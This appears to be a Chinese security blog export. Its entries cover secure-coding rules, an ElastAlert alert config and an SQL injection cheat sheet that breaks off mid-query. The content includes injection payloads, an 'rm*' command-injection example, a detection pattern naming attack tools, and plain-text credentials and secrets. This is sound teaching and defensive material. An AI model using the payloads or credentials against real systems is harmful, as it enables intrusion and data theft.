不安全的加密存储保护敏感数据已经成为网络应用的最重要的组成部分，加密的敏感数据已是非常常见安全保护手段。不加密的应用程序、设计不当或者使用不恰当的密码技术等可能导致披露敏感数据。 攻击者能够取得或是篡改机密的或是私有的信息； 攻击者通过机密秘密的窃取从而进行进一步的攻击； 造成企业形象破损，用户满意度下降，甚至面临法律诉讼等。编程要求： 验证你的结构； 识别所有的敏感数据； 识别敏感数据存放的所有位置； 确保所应用的威胁模型能够应付这些攻击； 使用加密手段来应对威胁； 使用一定的机制来进行保护 文件加密； 数据库加密； 数据元素加密； 正确的使用这些机制； 使用标准的强算法； 合理的生成，分发和保护密钥； 准备密钥的变更； 验证实现方法； 确保所有的证书、密钥和密码都得到了安全的存放； 有一个安全的密钥分发和应急处理的方案。 4.3.9 不安全的通信对于不加密的应用程序的网络信息传输，需要保护敏感的通信。加密（通常SSL）必须用于所有身份验证的连接，特别是通过Internet访问的网页，以及后端的连接。否则，应用程序将暴露身份验证或会话令牌。 攻击者能够取得或是篡改机密的或是私有的信息； 攻击者通过这些秘密的窃取从而进行进一步的攻击； 造成企业形象破损，用户满意度下降，甚至面临法律诉讼等。 编程要求： 提供合理的保护机制； 对于敏感数据的传输，对所有连接都要使用TLS； 在传输前对单个数据都要进行加密；（如XML-Encryption）； 在传输前对信息进行签名；（如XML-Signature）； 正确的使用这些机制； 使用标准的强算法； 合理管理密钥和证书； 在使用前验证SSL证书。 4.3.10 限制URL访问失效这个漏洞事实上也是与认证相关的，与我们前面提到的不安全的直接对象引用也是类似的，不同在于这个漏洞是指系统已经对URL的访问做了限制，但这种限制却实际并没有生效。常见的错误是，我们在用户认证后只显示给用户认证过的页面和菜单选项，而实际上这些仅仅是表示层的访问控制而不能真正生效，攻击者能够很容易伪造请求直接访问未被授权的页面。编程要求： 如果URL不是公开的，那么必须限制能够访问的授权用户； 加强基于用户或角色的访问控制； 完全禁止访问未被授权的页面类型（如配置文件、日志文件、源文件等）； 验证你的构架； 在每一个层次都使用简单肯定的模型； 确保每一层都有一个访问机制； 验证你的实现； 不能使用自动化的分析工具； 确保每个URL都被外部过滤器或其他机制保护； 确保服务器的配置不允许对非授权页面的访问。 4.4 PHP安全开发要求4.4.1 变量滥用PHP-4.1.0发布的时候建议关闭register_globals，并提供了7个特殊的数组变量来使用各种变量。对于从GET、POST、COOKIE等来的变量并不会直接注册成变量，必需通过数组变量来存取。PHP-4.2.0发布的时候，php.ini默认配置就是register_globals=Off。这使得程序使用PHP自身初始化的默认值，一般为0，避免了攻击者控制判断变量。通过以下解决方法实现：配置文件php.ini设置register_globals=Off。要求程序员对作为判断的变量在程序最开始初始化一个值。 4.4.2 文件打开如非特殊需要，把php的文件操作限制在Web目录里面。以下是修改apache配置文件httpd.conf的一个例子：12&lt;Directory/usr/local/apache/htdocs&gt;php_admin_valueopen_basedir/usr/local/apache/htdocs&lt;/Directory&gt; 重启apache后，/usr/local/apache/htdocs目录下的PHP脚本就只能操作它自己目录下的文件了，否则PHP就会报错：Warning:open_basedirrestrictionineffect.Fileisinwrongdirectoryinxxxonlinexx.使用safe_mode模式也能避免这种问题，前面已经讨论过。 4.4.3 文件包含要求程序员包含文件里的参数尽量不能使用变量，如果使用变量，就一定要严格检查要包含的文件名，绝对不能由用户任意指定。如前面文件打开中限PHP操作路径是一个必要的选项。另外，如非特殊需要，一定要关闭PHP的远程文件打开功能。修改php.ini文件：allow_url_fopen=Off重启apache。 4.4.4 文件上传PHP-4.0.3以后提供了is_uploaded_file和move_uploaded_file函数，可以检查操作的文件是否是用户上传的文件，从而避免把系统文件拷贝到Web目录。使用$HTTP_POST_FILES或$_FILES数组来读取用户上传的文件变量。严格检查上传变量。比如不允许是php脚本文件。把PHP脚本操作限制在Web目录可以避免程序员使用copy函数把系统文件拷贝到Web目录。move_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。把PHP脚本用phpencode进行加密，避免由于copy操作泄漏源码。严格配置文件和目录的权限，只允许上传的目录能够让nobody用户可写。对于上传目录去掉PHP解释功能，可以通过修改httpd.conf实现：123&lt;Directory/usr/local/apache/htdocs/upload&gt;php_flagengineoff#如果是php3换成php3_engineoff&lt;/Directory&gt; 重启apache，upload目录的php文件就不能被apache解释了，即使上传了php文件也没有问题，只能直接显示源码。 4.4.5 命令执行解决方法：要求程序员使用escapeshellcmd()函数过滤用户输入的shell命令。启用safe_mode可以杜绝很多执行命令的问题，不过要注意PHP的版本一定要是最新的，小于PHP-4.2.2的都可能绕过safe_mode的限制去执行命令。变量类型缺陷逻辑比较时注意变量类型。必要的时候使用”===”，那么连变量类型一起比较。 4.4.6 警告及错误信息修改php.ini中关于Errorhandlingandlogging部分内容：error_reporting=E_ALLdisplay_errors=Offlog_errors=Onerror_log=/usr/local/apache/logs/php_error.log然后重启apache，注意文件/usr/local/apache/logs/php_error.log，必需可以让nobody用户可写。 4.4.7 PHP与MySQL组合的SQL注入解决方法：要求程序员对所有用户提交的要放到SQL语句的变量进行过滤。即使是数字类型的字段，变量也要用单引号扩起来，MySQL自己会把字串处理成数字。在MySQL里不能给PHP程序高级别权限的用户，只允许对自己的库进行操作。 4.4.8 跨站脚本解决方法：确认输入strip_tags()htmlspecialchars()清除危险的插入点。 4.4.9 禁用无用的函数如果觉得有些函数还有威胁，可以设置php.ini里的disable_functions（这个选项不能在httpd.conf里设置），比如：disable_functions=phpinfo,get_cfg_var可以指定多个函数，用逗号分开。重启apache后，phpinfo,get_cfg_var函数都被禁止了。建议关闭函数phpinfo,get_cfg_var，这两个函数容易泄漏服务器信息，而且没有实际用处。 4.4.10 禁用某些类这个选项是从PHP-4.3.2开始才有的，它可以禁用某些类，如果有多个用逗号分隔类名。disable_classes也不能在httpd.conf里设置，只能在php.ini配置文件里修改。 4.4.11 限制脚本操作路径前面分析例程的时候也多次提到用open_basedir对脚本操作路径进行限制，这里再介绍一下它的特性。用open_basedir指定的限制实际上是前缀，不是目录名。也就是说open_basedir=/dir/incl也会允许访问/dir/include和/dir/incls，如果它们存在的话。如果要将访问限制在仅为指定的目录，用斜线结束路径名。例如：open_basedir=/dir/incl/。可以设置多个目录，在Windows中，用分号分隔目录。在任何其它系统中用冒号分隔目录。作为Apache模块时，父目录中的open_basedir路径自动被继承。 4.4.12 其他安全配置 1、 取消其它用户对常用、重要系统命令的读写执行权限 一般管理员维护只需一个普通用户和管理用户，除了这两个用户，给其它用户能够执行和访问的东西应该越少越好，所以取消其它用户对常用、重要系统命令的读写执行权限能在程序或者服务出现漏洞的时候给攻击者带来很大的迷惑。记住一定要连读的权限也去掉，否则在linux下可以用/lib/ld-linux.so.2/bin/ls这种方式来执行。 如果要取消程序如果是在chroot环境里，这个工作比较容易实现，否则，这项工作还是有些挑战的。因为取消一些程序的执行权限会导致一些服务运行不正常。PHP的mail函数需要/bin/sh去调用sendmail发信，所以/bin/bash的执行权限不能去掉。 2、 去掉apache日志其它用户的读权限：apache的access-log给一些出现本地包含漏洞的程序提供了方便之门。通过提交包含PHP代码的URL，可以使access-log包含PHP代码，那么把包含文件指向access-log就可以执行那些PHP代码，从而获得本地访问权限； 如果有其它虚拟主机，也应该相应去掉该日志文件其它用户的读权限； 当然，如果你按照前面介绍的配置PHP那么一般已经是无法读取日志文件了。 3、 保持运行环境干净。 4、 不能在Web目录放测试文件。 4.5 C/C++安全开发要求C本质上是不安全的编程语言。例如如果不谨慎使用的话，其大多数标准的字符串库函数有可能被用来进行缓冲区攻击或者格式字符串攻击。但是，由于其灵活性、快速和相对容易掌握，它是一个广泛使用的编程语言。下面是针对开发安全的C语言程序的一些规范。 4.5.1 缓冲区溢出避免使用不执行边界检查的字符串函数，因为它们可能被用来进行缓冲区溢出攻击。下面是应该避免使用的函数。同时，也列出了每个函数相应的比较安全的替换方式。 不使用strcpy()，使用strncpy()； 不使用strcat()，使用strncat()； 不使用sprintf()，使用snprintf()； 不使用gets()，使用fgets()。在上面的前三个中函数中，每个替代函数的“n”表示了使用的缓冲区的大小。最后一个函数的“f”，表示格式，它允许用户指定期望的输入的格式。这些替换方程强制程序员定义使用的缓冲区的尺寸以及确定输入的类型。 4.5.2 格式化字符串攻击该类攻击往往与缓冲区溢出相关，因为它们主要利用了某些函数的假设，例如sprintf()和vsprintf()假设缓冲区的长度是无限的。然而即使使用snprintf()替换sprintf()也无法完全保护程序不受格式化字符串的攻击。这些攻击通过直接将格式说明符（formatspecifiers）(%d，%s，%n等)传递到输出函数接收缓冲区来进行。例如，以下的代码就是不安全的snprintf(buffer,sizeof(buffer),string)这种情况下，可以在字符串中插入格式说明符来操纵内存的栈，来写入攻击者的数据（这些数据中包含小的程序代码，并可由处理器接着执行）。对以上的例子建议使用下面的代码。snprintf(buffer,sizeof(buffer),“%s”,string)进行格式字符串攻击不太容易。首先攻击者必须能获得内存栈的内容情况（或者从应用导出或者使用调试器），然后必须知道如何精确访问特定的内存空间来操纵栈中的变量。执行外部程序推荐使用exec()函数而不是system()函数来执行外部程序。这是因为system()接收整个命令行的随机的缓冲区来执行程序。12snprintf(buffer,sizeof(buffer),&quot;emacs%s&quot;,filename);system(buffer); 在以上的例子中，可以通过使用分号利用文件名变量在sehll中插入额外的命令（例如文件名可以是/etc/hosts;rm*，这将在显示/etc/hosts目录文件的同时，删除目录中的所有文件）。而exec()函数只保证第一个参数被执行：1execl(&quot;usr/bin/emacs&quot;,&quot;usr/bin/emacs&quot;,filename,NULL); 上面的例子保证文件名仅仅作为一个参数输入Emacs工具，同样它在Emacs命令中使用完全的路径而不是使用可以被攻击者利用的PATH环境变量。 4.5.3 竞争条件进程需要访问资源时（无论是磁盘、内存或是文件）通常需要执行两个步骤： 1、首先测试资源是否空闲可用； 2、如果可用，就访问该资源，否则它等到资源不再使用为止再去访问它。当另一个进程在步骤1和2之间想要访问同一个资源时就出现问题了。这会导致不可预测的结果。进程可能会被锁定，或者一个进程劫持获得了另一个进程的较大的权限而导致安全问题。攻击主要集中在有较大权限的程序上（称为setuid程序）。竞争条件攻击通常利用程序执行时可以访问到的资源。另外权限低的程序也存在安全风险，因为攻击者可能会等待有较高权限的用户执行那个程序(例如root)，然后进行攻击。下面的建议有助于缓解竞争条件(racecondition)攻击：在进行文件操作时，利用那些使用文件描述符的函数而不能使用那些使用文件路径的函数（例如使用fdopen()而不能使用fopen()）。文件描述符使得恶意的用户在文件打开时或是在原始的进程对文件进行操作前，无法使用文件连接（符号式的或是物理的）来改变文件。在写文件甚至在读文件时使用fcntl()和flock()函数来对文件加锁，这样它们就不能被其他进程访问。它几乎可以建立原子级的操作。谨慎操纵临时文件，因为它往往会导致竞争条件。 4.5.4 检验有效的返回值检验有效的返回值非常重要。一个例子是旧的/bin/login的实现中不检验错误的返回值，导致当它找不到/etc/passwd文件时返回root的访问权限。如果该文件损坏了，那么这种情况是合理的，但如果该文件存在只是无法访问，那么这就是一个大问题。 4.6 Perl安全开发要求多年以来，Perl已经成为用于系统管理和WebCGI开发的功能最强的编程语言之一（几乎可以使用Perl做任何功能的程序）。但其扩展应用，即作为Internet上CGI的开发工具，使得它经常成为Web服务器上的攻击目标。另外，大多数CGI脚本有着比一般用户更高的权限，导致它更容易受攻击。下面列举了一些开发者（特别是CGI程序员）可以使用的主动的预防性的措施来增强Perl代码的整体安全性（请注意：这不是Web服务器CGI脚本安全性的指导原则）。 4.6.1 Taint验证Perl版本5.x包含一个叫做TaintChecking的数据验证措施。如果起用该功能，将不允许通过用户输入（任何程序外的输入）来操纵其他的外部程序（例如通过管道将数据导入另一个程序执行））。一般而言，程序员不能信任输入脚本和程序的数据（叫做Tainted数据），因为无法保证它不会产生危害（有意或者无意的）。Taint验证可以通过在命令行参数加入“-T”来开启。例如：你可以在Perl脚本的第一行这样加入“-T”：#!usr/bin/perl5-TTainted数据包括命令行参数、环境变量和来自文件的数据。引用tainted数据的变量也称为tainted数据。如果脚本试图通过不安全的方式来使用tainted数据会产生一个致命错误（对这种情况称为“不安全的依赖”(Insecuredependency)或者其他的说法）。启用tainted验证在有些情况下会导致脚本停止运行，常常是由于Perl解释器要求所有脚本引用的外部程序的完全路径必须在PATH环境变量中列出，同时PATH中包含的每个目录除了目录的所有者及相应的所有者用户组外无法修改。Taint验证对于环境比较敏感，但是只要可能的话，应该使用taint验证，特别是代码执行其他程序功能时（例如在CGI脚本的情况下）。 4.6.2 安全模块如果不但输入数据不可信而且实际的代码也不可信，例如用户从网站上下载了一个ActiveX控件，而它实际是一个特洛伊木马(Trojanhorse)。这种情况下taint验证就不起作用。安全模块让程序员可以在Perl脚本中将不同的代码模块与安全对象联系。每个安全对象对于运行的每块代码建立了一个限制的环境。这与chroot在一个进程中只能在整体目录结构的一个子目录中运行类似。而saft对象限制perl代码只能在perl包结构的某些特定包中运行。如何使用安全模式超出了本文的范围，但是程序员应该在任何时候尽量使用这一功能。 4.6.3 警告参数使用-w参数可以在Perl解释脚本时显示所有的警告信息。警告可以在以下情况产生：只使用了一次的变量或者完全没有使用过得变量，未定义的文件句柄，未关闭的文件句柄，或者将非数值变量传递到数据变量。该功能不是针对安全处理的，但是可以有助于调试直接或者间接对安全有危害的错误。一般推荐总是使用-w参数。可以在taint验证时在第一行这样使用-w参数：#!usr/bin/perl5-Tw 5、 应用系统测试安全应用系统在正式上线前应对安全性进行测试，验证应用系统的安全性是否符合安全设计及安全需求，应用系统的安全测试包括以下内容： 5.1 测试前的要求测试之前，首先要确定测试大纲，在测试大纲中应当明确应用安全方面的测试内容、手段及方案（即测试用例）。包括： 安全性测试的环境要求； 安全性测试软件、测试设备要求； 安全性测试人员要求； 安全性测试的时间要求； 安全性测试的内容； 安全性测试的输入数据；?安全性测试的预期结果； 安全性测试的详细过程； 安全性测试的风险和风险规避方案。测试大纲中安全性方面的描述是进行安全性测试的一个重要依据。大纲内容的编写应当依据应用系统需求说明书及应用系统设计说明书中，有关安全方面的内容来编写相应的测试用例。 5.2 测试方法及内容要求 1、 应根据应用系统的具体情况，设计安全性测试的具体方法和内容，通常主要的测试方法和内容分为功能性测试、压力测试、渗透性测试、审核性测试。 2、 功能性测试要求：对应用系统的安全功能点进行测试，确保安全功能的有效性、正确性。 这些功能点应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。测试大纲中的这些内容应当覆盖了需求说明书中安全功能部分的要求。 测试的具体内容主要涉及以下几个方面： 安全审计 通信安全 数据保护 身份认证 容错及资源分配方面的要求 3、 压力测试：对应用系统的安全功能进行压力测试，确保安全功能可以满足设计的需要。 压力测试的具体应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。 测试大纲中的这些要求应当参照设计说明书中所描述的设计目标进行测试用例的设计，包括但不限于： 应用系统服务器端和单个终端进行安全数据传输的最大容量。 应用系统服务器端能够与多少终端同时进行安全数据传输。 服务器承受的最大并发连接数。 4、 渗透性测试：模拟攻击手段，对应用系统抵抗攻击的能力进行测试。主要测试应用程序及应用系统配置上的安全漏洞。 渗透测试的具体应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。 测试大纲中渗透测试方法的选择需要依据设计说明书中描述的应用系统采用的开发工具及应用系统安装所需要的基础应用平台，如iis、apached等，来设计不同的测试方法，包括但不限于： 对webserver的渗透攻击测试或者工具扫描性测试。 SQL注入、跨栈攻击。 5、 审核性测试： 代码审核。这不是必需的测试手段，如果条件允许，可以针对容易出现代码漏洞的程序，特别是关于身份认证等方面的部分代码进行审核。 可以采用开发相关的专用扫描工具，或者编制相应的脚本程序，检查代码中的不安全函数的使用，如：strcpy()，strcat()等。 6、 测试过程中，应详细记录测试过程发生的每一件事情，列出测试过程中发现的问题。这些信息包括：发现了什么，在哪里发现的，当时的环境，这些问题是否可重现。 7、 应根据测试的过程和测试结果，提出被测试系统、测试过程等方面的改进说明。 8、 应确保测试用例、测试内容和测试结果的保密性。 5.3 测试环境及人员安全要求 1、 测试环境的物理、硬软件环境要求应当可以模拟真实环境。 2、 为确保测试环境的安全，应将测试环境与开发环境、生产环境相隔离，避免测试工作对业务的影响。 3、 测试数据如果选择是真实数据，应限定使用该数据的测试人员的数量，并在测试完成后全部删除。 4、 系统测试和验收通常需要大量的（真实数据）尽可能靠近实际运行数据的测试数据。应避免使用含有个人信息的业务数据库。如果要使用其中信息，在用之前应使其失去个性化。当把运行数据用于测试目的时，应采取以下措施保护运行数据。 如果该数据由测试人员使用，则需要相关授权业务人员参与，或者监督。 每次把运行信息复制到测试应用系统都应有单独的授权。 应记录运行信息的复制和使用，以提供一种检查追踪。 5、 在与其他系统的互操作性测试中，应充分考虑对其他系统的影响，选择适当的时间、方法。 5.4 测试后的要求测试完成后，在正式上线前，应进行安全检查，消除测试用的一切后门、用户名及口令等，包括但不限于： 1、 测试用的测试数据，即测试过程中的临时数据，特别注意要删除授权访问的那些重要测试数据。 2、 测试用的账号、口令，特别是有高级权限的账号。 3、 测试用时临时开通的系统服务、防火墙端口及策略。 4、 与外系统测试时，要求外系统上临时开启的服务、账号等。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK实现微信告警]]></title>
    <url>%2Fdeployment%2FELK%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[安装elastalertgit clone https://github.com/Yelp/elastalert.gitcd elastalertpython setup.py installpip install -r requirements.txtcp config.yaml.example config.yaml 配置elastalert在es上创建索引elastalert-create-index修改配置文件vi config.yaml123456789101112rules_folder: example_rulesrun_every: seconds: 3buffer_time: minutes: 15es_host: 192.168.3.110es_port: 9200es_username: elastices_password: shuqinkejiwriteback_index: elastalert_statusalert_time_limit: days: 1 mkdir elastalert_modules/微信告警插件：下载wechat_qiye_alert.py脚本到elastalert_modules目录下touch elastalert_modules/__init__.pycd example_rules/vi example_frequency.yaml1234567891011121314151617181920212223242526272829es_host: 192.168.1.41es_port: 9200use_ssl: falsees_username: elastices_password: shuqinkejiname: Example frequency ruletype: frequencyindex: nginx*num_events: 5timeframe: hours: 1 filter: - query_string: # SQL、XSS、扫描 query: &quot;request: select.+(from|limit) OR request: union(.*?)select OR request: into.+(dump|out)file OR request: (base64_decode|sleep|benchmark|and.+1=1|and.+1=2|or%20|exec|information_schema|where%20|union%20|%2ctable_name%20|cmdshell|table_schema) OR request: (iframe|script|body|img|layer|div|meta|style|base|object|input|onmouseover|onerror|onload|alert) OR request: .+etc.+passwd OR http_user_agent：(HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench) OR status: (400|404|500|501) NOT (request:_health.html OR remote_addr:222.222.222.222 ) &quot;include: [&quot;data.slbip&quot;,&quot;data.method&quot;,&quot;data.url&quot;,&quot;data.status&quot;,&quot;data.serverip&quot;,&quot;data.referer&quot;]alert:- &quot;elastalert_modules.wechat_qiye_alert.WeChatAlerter&quot;corp_id: ww6bb8958dca9fe27bsecret: c0RvZ906WXuuaJE_Jxd3eUq2bQJWwfoAZPJX8MjNzPgagent_id: 1000002party_id: 1user_id: &quot;@all&quot; 更多配置详见 官方文档]]></content>
      <categories>
        <category>deployment</category>
      </categories>
      <tags>
        <tag>企业安全</tag>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS wiki]]></title>
    <url>%2FBug%2FXSS%2F</url>
    <content type="text"><![CDATA[一、概述 跨站点脚本（XSS）攻击是一种注入类型，其中恶意脚本被注入到其他良性和可信赖的网站中。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序在其生成的输出中使用来自用户的输入而无需验证或编码它的任何地方。 攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookie，会话令牌或浏览器保留并与该站点一起使用的其他敏感信息。这些脚本甚至可以重写HTML页面的内容。 二、XSS类型 XSS攻击通常可以分为三类：反射型、存储型和DOM型。 1.反射型 反射型是指注入的脚本从Web服务器反射出来的攻击，例如错误消息，搜索结果或包含作为请求的一部分发送到服务器的部分或全部输入的任何其他响应。反射型攻击在电子邮件中或在其他一些网站上植入恶意代码。当用户被欺骗点击恶意链接，提交特制表单，甚至只是浏览恶意网站时，注入的代码会发送到易受攻击的网站，之后服务器将代码返回浏览器，浏览器执行来自“可信”服务器的恶意代码。 2.存储型 存储型是指注入的脚本永久存储在目标服务器上的攻击，例如在数据库，消息论坛，访问者日志，注释字段等中。受害者在请求存储时从服务器检索恶意脚本。 3.DOM型 DOM型是指注入的脚本修改受害者浏览器中的DOM“环境”而执行，以便客户端代码以“意外”方式运行。页面本身（即HTTP响应）不会改变，但由于DOM环境中发生的恶意修改。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>wiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入wiki]]></title>
    <url>%2FBug%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1. 检测SQL注入 可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加&#39;或&quot;从而得到一个从Web服务器返回的数据库报错信息。以下部分描述了在哪里可以找到这些参数以及如何检测这些参数。 参数位置HTTP请求中常见的注入点如下 GET - HTTP Request 在常见的HTTP GET请求（以及大多数请求类型）中，有一些常见的注入点。例如：网址参数（下面的请求的id），Cookie，host以及任何自定义headers信息。然而，HTTP请求中的任何内容都可能容易受到SQL注入的攻击。 1234567891011GET /?id=注入点1 HTTP/1.1Host: 注入点2Connection: closeCache-Control: max-age=0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36Upgrade-Insecure-Requests: 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9X-Server-Name: 注入点3Cookie: user=注入点4; POST - Form Data 在具有Content-Type为application/x-www-form-urlencoded的标准HTTP POST请求中，注入将类似于GET请求中的URL参数。它们位于HTTP头信息下方，但仍可以用相同的方式进行利用。 123456POST / HTTP/1.1Host: netspi.com.comContent-Type: application/x-www-form-urlencodedContent-Length: 39username=注入点1&amp;email=注入点2 POST - JSON 在具有Content-Type为application/json的标准HTTP POST请求中，注入通常是JSON{&quot;key&quot;:&quot;value&quot;}对的值。该值也可以是数组或对象。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用&#39;，但要确保JSON使用双引号，否则可能会破坏请求格式。） 123456789POST / HTTP/1.1Host: netspi.com.comContent-Type: application/jsonContent-Length: 56&#123;"username":"注入点1","email":"注入点2"&#125; POST - XML 在具有Content-Type为application/xml的标准HTTP POST请求中，注入通常在一个内部。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用&#39;） 123456789POST / HTTP/1.1Host: netspi.com.comContent-Type: application/xmlContent-Length: 79&lt;root&gt;&lt;username&gt;注入点1&lt;/username&gt;&lt;email&gt;注入点2&lt;/email&gt;&lt;/root&gt; 检测注入 通过在应用程序中触发错误和布尔逻辑，可以最轻松地检测易受攻击的参数。提供格式错误的查询将触发错误，并且使用各种布尔逻辑语句发送有效查询将触发来自Web服务器的不同响应。 注：True或False语句应通过HTTP状态码或HTML内容返回不同的响应。如果这些响应与查询的True/False性质一致，则表示存在注入。 描述 语句 逻辑测试 page.asp?id=1 or 1=1 – true page.asp?id=1’ or 1=1 – truepage.asp?id=1” or 1=1 – truepage.asp?id=1 and 1=2 – false 算术 product.asp?id=1/1 – true product.asp?id=1/0 – false 基于盲注：检测盲注可能需要识别或猜测DBMS，并检查以找到适当的时间函数。 详见 基于错误：注意：使用无效语法的逻辑测试和算术也可能会导致错误。 详见 2.DBMS识别 检测正在使用的数据库管理系统（DBMS）对于进一步利用注入来说至关重要。没有这些知识，就无法确定要查询的表，内置的函数以及要避免的检测。下面查询的成功响应表明正在使用所选的DBMS. 注意：注释字符 -- 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。 MySQL 描述 语句 SLEEP page.php?id=1’-SLEEP(1)=0 LIMIT 1 – BENCHMARK page.php?id=1’-BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’))=0 LIMIT 1 – 字符串连接 page.php?id=’ ‘mysql’ – 错误消息注意：通过无效语法触发数据库错误有时会返回包含DBMS名称的详细错误消息。 page.php?id=’ 一般提示 PHP应用程序通常具有MySQL数据库。 将查询转换为注入 既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。SELECT @@version将是示例查询。 描述 语句 联合查询 product.php?id=’ UNION SELECT @@version – 联合子查询 product.php?id=’ UNION (SELECT @@version) – 联合null 注意：如果原始查询返回多个列，则添加null以等于列数 product.php?id=4 UNION SELECT @@version,null – 堆积式查询注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。 product.php?id=’; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version)) – Oracle 描述 语句 字符串连接 page.jsp?id=’&#124;&#124;’oracle’ – 默认表 page.jsp?id=’UNION SELECT 1 FROM v$version – 错误消息注意：通过无效语法触发数据库错误有时会返回包含DBMS名称的详细错误消息。 page.jsp?id=’ 一般提示 根据应用程序提供的错误，如果存在“ORA-XXXX”错误，其中每个X都是整数，则表示数据库是Oracle. JSP应用程序通常具有Oracle数据库。 将查询转换为注入 既然已经确定了诸如点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。SELECT banner FROM v$version将是示例查询。 描述 语句 联合查询 product.jsp?id=’ UNION SELECT banner FROM v$version – 联合子查询 product.jsp?id=’ UNION (SELECT banner FROM v$version) – 联合null 注意:如果原始查询返回多个列，则添加null以等于列数-1 product.jsp?id=’ UNION SELECT banner,null FROM v$version – SQL Server 描述 语句 WAITFOR 函数 page.asp?id=’;WAITFOR DELAY ‘00&#58;00&#58;10’; – 默认变量 page.asp?id=sql’; SELECT @@SERVERNAME – 错误消息注意：通过无效语法触发数据库错误有时会返回包含DBMS名称的详细错误消息。 page.asp?id=’ 错误消息注意：如果id参数是整数，则@@ SERVERNAME变量的字符串值可能导致转换错误。 page.asp?id=@@SERVERNAME 错误消息注意：如果id参数是整数，则@@ SERVERNAME变量的字符串值可能导致转换错误。 page.asp?id=0/@@SERVERNAME 一般提示 基于ASP / ASPX的应用程序一般都是MSSQL。 将查询转换为注入 既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。SELECT @@version将是示例查询。 描述 语句 联合查询 product.asp?id=’ UNION SELECT @@version – 联合子查询 product.asp?id=’ UNION (SELECT @@version) – 联合null 注意：如果原始查询返回多个列，则添加null以等于列数 product.asp?id=’ UNION (SELECT @@version,null) – 堆积式查询注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。 product.asp?id=’; SELECT @@version – 3.注入类型显错注入 当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。 MYSQL 描述 语句 XML解析错误 SELECT extractvalue(rand(),concat(0x3a,(select version()))) 双查询 SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) 递增 limit 0,1到limit 1,1开始循环数据 获取当前数据库 SELECT a() Oracle 描述 语句 无效的HTTP请求 SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual 无效的XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual 无效的XML SELECT to_char(dbms_xmlgen.getxml(‘select “‘&#124;&#124;(select user from sys.dual)&#124;&#124;’” FROM sys.dual’)) FROM dual 无效的XML SELECT rtrim(extract(xmlagg(xmlelement(“s”, username &#124;&#124; ‘,’)),’/s’).getstringval(),’,’) FROM all_users SQL Server 描述 语句 显式转换 SELECT convert(int,(SELECT @@version)) SELECT cast((SELECT @@version) as int) 隐式转换 SELECT 1/@@version MSSQL CAST函数示例 以下任何查询都可以使用该convert函数重写或作为隐式转换. 描述 语句 将CAST函数注入当前查询 SELECT CAST(@@version as int) 显示系统用户 SELECT CAST(SYSTEM_USER as int); 用xml路径在一行中显示所有数据库 SELECT CAST((SELECT name,’,’ FROM master..sysdatabases FOR XML path(‘’)) as int) SELECT CAST((SELECT name AS “data()” FROM master..sysdatabases FOR xml path(‘’)) AS int); 显示服务器名称 SELECT CAST(@@SERVERNAME as int); 显示服务名称 SELECT CAST(@@SERVICENAME as int); 显示数据库列表 注意：下面的查询必须在一行中执行。 DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM master..sysdatabases;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int); 显示表列表 注意：下面的查询必须在一行中执行 DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..sysobjects WHERE type = &#39;U&#39;;SELECT @myoutput = SUBSTRING(@listStr , 1, 